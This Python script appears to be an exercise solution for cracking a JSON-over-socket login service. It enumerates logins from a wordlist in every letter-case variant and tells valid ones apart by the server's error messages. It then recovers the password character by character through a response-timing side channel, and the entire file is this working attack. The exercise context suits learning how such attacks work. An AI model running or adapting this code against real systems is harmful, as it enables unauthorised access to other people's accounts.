import json
import string
from itertools import product
from socket import socket
from sys import argv
from time import time

wrong_login = {"result": "Wrong login!"}
wrong_password = {"result": "Wrong password!"}
bad_request = {"result": "Bad request!"}
exception_happened = {"result": "Exception happened during login"}
connection_success = {"result": "Connection success!"}


def login_generator():
    with open('logins.txt', 'r') as f:
        for line in f:
            cases = [(c.lower(), c.upper()) for c in line.strip()]
            # Create a set to remove duplicates
            logins = set(map(''.join, product(*cases)))
            for login in logins:
                yield login


def password_generator():
    with open('passwords.txt', 'r') as f:
        for line in f:
            cases = [(c.lower(), c.upper()) for c in line.strip()]
            # Create a set to remove duplicates
            passwords = set(map(''.join, product(*cases)))
            for password in passwords:
                yield password


def find_login(client_socket):
    for login in login_generator():
        client_socket.send(json.dumps({"login": login, "password": "_"}).encode())
        response = client_socket.recv(1024)
        if json.loads(response.decode()) == wrong_password or json.loads(response.decode()) == exception_happened:
            return login


def find_password(client_socket):
    password = ""
    sleshold = 0.1
    chars = string.ascii_letters + string.digits
    while True:
        for c in chars:
            start = time()
            client_socket.send(json.dumps({"login": login, "password": password + c}).encode())
            response = client_socket.recv(1024)
            end = time()
            if end - start > sleshold or json.loads(response.decode()) == exception_happened:
                password += c
                break
            if json.loads(response.decode()) == connection_success:
                return password + c


if __name__ == '__main__':
    address = argv[1]
    port = int(argv[2])

    with socket() as client_socket:
        client_socket.connect((address, port))

        login = find_login(client_socket)
        password = find_password(client_socket)

        print(json.dumps({"login": login, "password": password}))
